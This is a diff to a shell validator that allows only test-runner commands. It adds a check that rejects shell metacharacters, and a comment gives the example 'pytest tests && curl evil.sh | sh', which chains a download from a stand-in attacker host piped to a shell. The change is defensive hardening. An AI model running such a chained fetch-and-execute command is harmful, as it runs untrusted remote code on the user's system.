@@ -13,48 +13,33 @@ cmd="$1"
 # Trim leading whitespace
 cmd_trimmed="${cmd#"${cmd%%[![:space:]]*}"}"
 
+# Reject shell metacharacters so an allowed runner prefix cannot smuggle a
+# compound command (e.g. `pytest tests && curl evil.sh | sh`).
 case "$cmd_trimmed" in
-  pytest\ *|pytest)
-    exit 0
-    ;;
-  python\ -m\ pytest\ *|python\ -m\ pytest)
-    exit 0
-    ;;
-  go\ test\ *|go\ test)
-    exit 0
-    ;;
-  npm\ test\ *|npm\ test)
-    exit 0
-    ;;
-  yarn\ test\ *|yarn\ test)
-    exit 0
-    ;;
-  pnpm\ test\ *|pnpm\ test)
-    exit 0
-    ;;
-  npx\ vitest\ *|npx\ vitest)
-    exit 0
-    ;;
-  npx\ jest\ *|npx\ jest)
-    exit 0
-    ;;
-  cargo\ test\ *|cargo\ test)
-    exit 0
-    ;;
-  mvn\ test\ *|mvn\ test)
-    exit 0
-    ;;
-  ./gradlew\ test\ *|./gradlew\ test)
-    exit 0
-    ;;
-  rspec\ *|rspec)
-    exit 0
-    ;;
-  mix\ test\ *|mix\ test)
-    exit 0
-    ;;
-  *)
-    printf '%s\n' "command not on test-runner allowlist: $cmd_trimmed" >&2
-    exit 1
-    ;;
+*';'* | *'&'* | *'|'* | *'`'* | *'$('* | *'>'* | *'<'* | *$'\n'*)
+  printf '%s\n' "command contains shell metacharacters: $cmd_trimmed" >&2
+  exit 1
+  ;;
+esac
+
+case "$cmd_trimmed" in
+pytest\ * | pytest | \
+  python\ -m\ pytest\ * | python\ -m\ pytest | \
+  go\ test\ * | go\ test | \
+  npm\ test\ * | npm\ test | \
+  yarn\ test\ * | yarn\ test | \
+  pnpm\ test\ * | pnpm\ test | \
+  npx\ vitest\ * | npx\ vitest | \
+  npx\ jest\ * | npx\ jest | \
+  cargo\ test\ * | cargo\ test | \
+  mvn\ test\ * | mvn\ test | \
+  ./gradlew\ test\ * | ./gradlew\ test | \
+  rspec\ * | rspec | \
+  mix\ test\ * | mix\ test)
+  exit 0
+  ;;
+*)
+  printf '%s\n' "command not on test-runner allowlist: $cmd_trimmed" >&2
+  exit 1
+  ;;
 esac
